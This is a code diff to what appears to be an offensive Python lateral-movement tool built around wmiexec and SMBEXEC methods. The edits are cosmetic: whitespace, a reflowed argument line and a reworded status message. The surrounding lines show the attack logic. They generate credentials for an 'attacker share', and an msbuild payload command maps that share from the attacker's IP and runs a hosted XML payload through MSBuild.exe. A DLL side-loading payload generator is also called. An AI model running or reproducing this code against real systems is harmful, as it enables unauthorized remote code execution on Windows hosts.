@@ -966,7 +966,7 @@ def setup_share():
         share_pass = ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase + string.digits, k=35))
     else:
         share_pass = options.sharepassword
-        
+
     if options.payloadname is None:
         payload_name = ''.join(random.choices(string.ascii_lowercase, k=10))
     else:
@@ -1274,8 +1274,7 @@ if __name__ == '__main__':
                                                        'https://docs.python.org/3/library/codecs.html#standard-encodings and then execute wmiexec.py '
                                                        'again with -codec and the corresponding codec ' % CODEC)
     parser.add_argument('-com-version', action='store', metavar="MAJOR_VERSION:MINOR_VERSION", help='DCOM version, format is MAJOR_VERSION:MINOR_VERSION e.g. 5.7')
-    parser.add_argument('-service-name', action='store', metavar="service_name", default=SERVICE_NAME,
-                        help='The name of the service used to trigger the payload (SMBEXEC only)')
+    parser.add_argument('-service-name', action='store', metavar="service_name", default=SERVICE_NAME, help='The name of the service used to trigger the payload (SMBEXEC only)')
 
     parser.add_argument('-sharename', action='store', help='Set the name of the attacker share Default=random')
     parser.add_argument('-shareuser', action='store', help='Set the username of the user for the share Default=random')
@@ -1430,7 +1429,7 @@ if __name__ == '__main__':
             gen_payload_dllsideload(share_name, addresses)
 
         if options.oe == False:
-            print("\n[This is where the fun begins]\n{} Executing payload via {}\n".format(green_plus, options.method))
+            print("\n[This is where the fun begins]\n{} Executing {} via {}\n".format(green_plus, options.payload, options.method))
 
         if options.payload == 'msbuild':
             command = r"net use {}: \\{}\{} /user:{} {} /persistent:No && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe {}:\{}.xml && net use {}: /delete /yes".format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, payload_name, drive_letter)
